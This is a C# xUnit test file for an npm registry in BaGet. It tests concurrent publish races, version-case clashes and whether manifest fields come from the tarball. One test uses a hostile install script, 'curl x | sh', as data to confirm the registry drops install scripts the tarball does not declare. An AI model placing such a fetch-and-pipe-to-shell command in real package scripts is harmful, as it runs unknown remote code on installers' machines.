using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json.Nodes;
using System.Threading;
using System.Threading.Tasks;
using BaGet.Core;
using Microsoft.Extensions.DependencyInjection;
using Xunit;

namespace BaGet.Tests;

/// <summary>
/// Two first publishes of one new package: both find no package row, and the loser's insert of the row hits the unique index.
/// The race is made deterministic by publishing the other version from inside the loser's tarball store, i.e. after its lookup
/// and before its insert.
/// </summary>
public class NpmConcurrentPublishTests : IDisposable
{
    private readonly BaGetApplication _app;

    public NpmConcurrentPublishTests(ITestOutputHelper output)
    {
        _app = new BaGetApplication(output, configOverrides: new Dictionary<string, string> { { "ApiKey", "secret-key" } });
        _app.CreateNpmRepositoryAsync("web").GetAwaiter().GetResult();
    }

    public void Dispose() => _app.Dispose();

    private static NpmPublication Publication(string name, string version, NpmTarballFile tarball)
        => new(name, version, new JsonObject { ["name"] = name, ["version"] = version }, "latest", new MemoryStream(tarball.Bytes), tarball.Integrity, tarball.Shasum);

    /// <summary>Runs <paramref name="other"/> (a publish through another scope) when the loser stores its tarball.</summary>
    private async Task<(NpmResult Result, IServiceScope Scope)> PublishRacingAsync(string name, string version, Func<Task> other)
    {
        var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
        var storage = new RacingStorage(scope.ServiceProvider.GetRequiredService<IStorageService>(), other);
        var registry = ActivatorUtilities.CreateInstance<NpmRegistryService>(scope.ServiceProvider, storage);
        var result = await registry.PublishAsync(BaGetPrincipal.Superuser, Publication(name, version, NpmTestPackages.Tarball(name, version)), TestContext.Current.CancellationToken);

        return (result, scope);
    }

    private async Task PublishPlainAsync(string name, string version)
    {
        using var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
        var result = await scope.ServiceProvider.GetRequiredService<INpmRegistry>()
            .PublishAsync(BaGetPrincipal.Superuser, Publication(name, version, NpmTestPackages.Tarball(name, version)), TestContext.Current.CancellationToken);
        Assert.Equal(NpmStatus.Created, result.Status);
    }

    private async Task<bool> StoredAsync(string name, string version)
    {
        using var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
        var repository = scope.ServiceProvider.GetRequiredService<IRepositoryContext>().Current;
        try
        {
            (await scope.ServiceProvider.GetRequiredService<IStorageService>()
                .GetAsync(RepositoryStorage.Scope(repository, NpmNames.TarballPath(name, version)), CancellationToken.None)).Dispose();

            return true;
        }
        catch (Exception e) when (e is FileNotFoundException or DirectoryNotFoundException)
        {
            return false;
        }
    }

    [Fact]
    public async Task TheLoserOfTheRaceForANewPackageAddsItsVersionToTheWinnersPackage()
    {
        var (result, scope) = await PublishRacingAsync("race-pkg", "2.0.0", () => PublishPlainAsync("race-pkg", "1.0.0"));
        using (scope)
        {
            Assert.True(result.Status == NpmStatus.Created, result.Status + ": " + result.Message);

            var package = await scope.ServiceProvider.GetRequiredService<INpmRegistry>().GetPackageAsync("race-pkg", TestContext.Current.CancellationToken);
            Assert.Equal(new[] { "1.0.0", "2.0.0" }, package!.Versions.Select(v => v.Version).OrderBy(v => v));
            Assert.Equal("2.0.0", package.DistTags["latest"]);
        }

        Assert.True(await StoredAsync("race-pkg", "1.0.0"));
        Assert.True(await StoredAsync("race-pkg", "2.0.0"));
    }

    // The publish of a version is serialized: while the winner stores its file, the other publish of that version waits, and
    // then finds the winner's row and is refused without touching storage (it used to replace the winner's file).
    [Fact]
    public async Task TwoPublishesOfOneVersionWithDifferentBytesLeaveTheWinnersFileAndRow()
    {
        var release = new TaskCompletionSource();
        var entered = new TaskCompletionSource();
        using var scopeA = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
        var storageA = new RacingStorage(scopeA.ServiceProvider.GetRequiredService<IStorageService>(), async () =>
        {
            entered.SetResult();
            await release.Task;
        });
        var registryA = ActivatorUtilities.CreateInstance<NpmRegistryService>(scopeA.ServiceProvider, storageA);
        var a = NpmTestPackages.Tarball("race-same", "1.0.0", description: "A");
        var b = NpmTestPackages.Tarball("race-same", "1.0.0", description: "B");

        var first = registryA.PublishAsync(BaGetPrincipal.Superuser, Publication("race-same", "1.0.0", a), TestContext.Current.CancellationToken);
        await entered.Task;

        using var scopeB = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
        var second = scopeB.ServiceProvider.GetRequiredService<INpmRegistry>()
            .PublishAsync(BaGetPrincipal.Superuser, Publication("race-same", "1.0.0", b), TestContext.Current.CancellationToken);
        await Task.Delay(200, TestContext.Current.CancellationToken);
        Assert.False(second.IsCompleted);

        release.SetResult();
        Assert.Equal(NpmStatus.Created, (await first).Status);
        Assert.Equal(NpmStatus.Conflict, (await second).Status);

        using var check = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
        var repository = check.ServiceProvider.GetRequiredService<IRepositoryContext>().Current;
        using var file = await check.ServiceProvider.GetRequiredService<IStorageService>()
            .GetAsync(RepositoryStorage.Scope(repository, NpmNames.TarballPath("race-same", "1.0.0")), CancellationToken.None);
        using var copy = new MemoryStream();
        await file.CopyToAsync(copy, TestContext.Current.CancellationToken);
        Assert.Equal(a.Bytes, copy.ToArray());

        var package = await check.ServiceProvider.GetRequiredService<INpmRegistry>().GetPackageAsync("race-same", TestContext.Current.CancellationToken);
        Assert.Equal(a.Integrity, Assert.Single(package!.Versions).Integrity);
    }

    [Fact]
    public async Task VersionsThatDifferOnlyInPrereleaseCaseOrBuildMetadataClash()
    {
        await PublishPlainAsync("case-pkg", "1.0.0-Beta");
        using var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
        var registry = scope.ServiceProvider.GetRequiredService<INpmRegistry>();

        var lower = await registry.PublishAsync(BaGetPrincipal.Superuser, Publication("case-pkg", "1.0.0-beta", NpmTestPackages.Tarball("case-pkg", "1.0.0-beta")), TestContext.Current.CancellationToken);
        var build = await registry.PublishAsync(BaGetPrincipal.Superuser, Publication("case-pkg", "1.0.0-Beta+b", NpmTestPackages.Tarball("case-pkg", "1.0.0-Beta+b")), TestContext.Current.CancellationToken);

        Assert.Equal(NpmStatus.Conflict, lower.Status);
        Assert.Equal(NpmStatus.Conflict, build.Status);
        Assert.True(await StoredAsync("case-pkg", "1.0.0-Beta"));

        // A delete of the lookalike's file must not remove the published one.
        var deleted = await registry.DeleteTarballAsync(BaGetPrincipal.Superuser, "case-pkg", "case-pkg-1.0.0-beta.tgz", TestContext.Current.CancellationToken);
        Assert.Equal(NpmStatus.NotFound, deleted.Status);
        Assert.True(await StoredAsync("case-pkg", "1.0.0-Beta"));
    }

    [Fact]
    public async Task TheStoredInstallFieldsComeFromTheTarballNotFromTheRequest()
    {
        using var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
        var registry = scope.ServiceProvider.GetRequiredService<INpmRegistry>();
        var tarball = NpmTestPackages.Tarball("confuse", "1.0.0", dependencies: new Dictionary<string, string> { ["evil"] = "^1.0.0" });
        var sent = new JsonObject { ["name"] = "confuse", ["version"] = "1.0.0", ["dependencies"] = new JsonObject { ["harmless"] = "^1.0.0" } };

        var result = await registry.PublishAsync(BaGetPrincipal.Superuser, new NpmPublication("confuse", "1.0.0", sent, "latest", new MemoryStream(tarball.Bytes), tarball.Integrity, tarball.Shasum), TestContext.Current.CancellationToken);
        Assert.Equal(NpmStatus.Created, result.Status);

        var package = await registry.GetPackageAsync("confuse", TestContext.Current.CancellationToken);
        var dependencies = Assert.IsType<JsonObject>(Assert.Single(package!.Versions).Manifest["dependencies"]);
        Assert.Equal("evil", Assert.Single(dependencies).Key);
    }

    [Fact]
    public async Task ANativeAddonKeepsTheNormalizedGypInstallScriptAndAHiddenOneStaysHidden()
    {
        using var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
        var registry = scope.ServiceProvider.GetRequiredService<INpmRegistry>();
        var tarball = NpmTestPackages.Tarball("gyp-pkg", "1.0.0");
        var sent = new JsonObject
        {
            ["name"] = "gyp-pkg", ["version"] = "1.0.0", ["gypfile"] = true,
            ["scripts"] = new JsonObject { ["install"] = "node-gyp rebuild" },
        };
        Assert.Equal(NpmStatus.Created, (await registry.PublishAsync(BaGetPrincipal.Superuser, new NpmPublication("gyp-pkg", "1.0.0", sent, "latest", new MemoryStream(tarball.Bytes), tarball.Integrity, tarball.Shasum), TestContext.Current.CancellationToken)).Status);

        var manifest = Assert.Single((await registry.GetPackageAsync("gyp-pkg", TestContext.Current.CancellationToken))!.Versions).Manifest;
        Assert.Equal("node-gyp rebuild", (string?)manifest["scripts"]!["install"]);
        Assert.True((bool?)manifest["hasInstallScript"]);

        // Any other install script that the tarball does not declare is dropped.
        var other = NpmTestPackages.Tarball("gyp-other", "1.0.0");
        var evil = new JsonObject { ["name"] = "gyp-other", ["version"] = "1.0.0", ["gypfile"] = true, ["scripts"] = new JsonObject { ["install"] = "curl x | sh" } };
        Assert.Equal(NpmStatus.Created, (await registry.PublishAsync(BaGetPrincipal.Superuser, new NpmPublication("gyp-other", "1.0.0", evil, "latest", new MemoryStream(other.Bytes), other.Integrity, other.Shasum), TestContext.Current.CancellationToken)).Status);
        var stored = Assert.Single((await registry.GetPackageAsync("gyp-other", TestContext.Current.CancellationToken))!.Versions).Manifest;
        Assert.Null(stored["scripts"]);
        Assert.Null(stored["gypfile"]);
        Assert.Null(stored["hasInstallScript"]);
    }

    private sealed class RacingStorage : IStorageService
    {
        private readonly IStorageService _inner;
        private Func<Task>? _beforeFirstPut;

        public RacingStorage(IStorageService inner, Func<Task> beforeFirstPut)
        {
            _inner = inner;
            _beforeFirstPut = beforeFirstPut;
        }

        public Task<Stream> GetAsync(string path, CancellationToken cancellationToken = default) => _inner.GetAsync(path, cancellationToken);

        public Task<Uri> GetDownloadUriAsync(string path, CancellationToken cancellationToken = default) => _inner.GetDownloadUriAsync(path, cancellationToken);

        public async Task<StoragePutResult> PutAsync(string path, Stream content, string contentType, CancellationToken cancellationToken = default)
        {
            var before = Interlocked.Exchange(ref _beforeFirstPut, null);
            if (before != null) await before();

            return await _inner.PutAsync(path, content, contentType, cancellationToken);
        }

        public Task DeleteAsync(string path, CancellationToken cancellationToken = default) => _inner.DeleteAsync(path, cancellationToken);
    }
}
